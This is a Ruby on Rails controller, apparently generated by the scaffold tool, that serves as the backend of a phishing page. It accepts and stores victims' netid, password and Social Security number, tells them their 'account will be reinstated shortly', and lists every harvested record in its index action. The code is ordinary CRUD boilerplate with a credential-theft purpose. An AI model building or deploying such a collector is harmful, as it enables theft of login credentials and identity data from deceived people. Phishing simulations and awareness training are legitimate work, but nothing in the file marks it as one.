class PhishesController < ApplicationController
  before_action :set_phish, only: [:show, :edit, :update, :destroy]

  # GET /phishes
  # GET /phishes.json
  def index
    @phishes = Phish.all
  end

  # GET /phishes/1
  # GET /phishes/1.json
  def show
  end

  # GET /phishes/new
  def new
    @phish = Phish.new
  end

  # GET /phishes/1/edit
  def edit
  end

  # POST /phishes
  # POST /phishes.json
  def create
    @phish = Phish.new(phish_params)

    respond_to do |format|
      if @phish.save
        format.html { redirect_to @phish, notice: 'Thank you for you submission, your account will be reinstated shortly!.' }
        format.json { render :show, status: :created, location: @phish }
      else
        format.html { render :new }
        format.json { render json: @phish.errors, status: :unprocessable_entity }
      end
    end
  end

  # PATCH/PUT /phishes/1
  # PATCH/PUT /phishes/1.json
  def update
    respond_to do |format|
      if @phish.update(phish_params)
        format.html { redirect_to @phish, notice: 'Phish was successfully updated.' }
        format.json { render :show, status: :ok, location: @phish }
      else
        format.html { render :edit }
        format.json { render json: @phish.errors, status: :unprocessable_entity }
      end
    end
  end

  # DELETE /phishes/1
  # DELETE /phishes/1.json
  def destroy
    @phish.destroy
    respond_to do |format|
      format.html { redirect_to phishes_url, notice: 'Phish was successfully destroyed.' }
      format.json { head :no_content }
    end
  end

  private
    # Use callbacks to share common setup or constraints between actions.
    def set_phish
      @phish = Phish.find(params[:id])
    end

    # Never trust parameters from the scary internet, only allow the white list through.
    def phish_params
      params.fetch(:phish, {}).permit(:netid, :password, :ssn)
    end
end
